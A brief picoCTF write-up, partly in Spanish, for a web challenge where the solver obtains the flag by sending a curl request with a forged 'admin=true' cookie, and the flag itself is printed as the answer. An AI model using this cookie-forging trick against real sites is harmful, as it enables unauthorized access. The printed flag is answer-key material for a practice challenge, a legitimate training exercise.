## Descripcion
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

## Pistas

Hmm it doesn't seem to check anyone's password, except for Joe's?

## Solucion
``` bash 
fedeloko-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: admin=true"  
```

## Bandera
**Flag**: picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}

## Notas adicionales
|

## Referencias
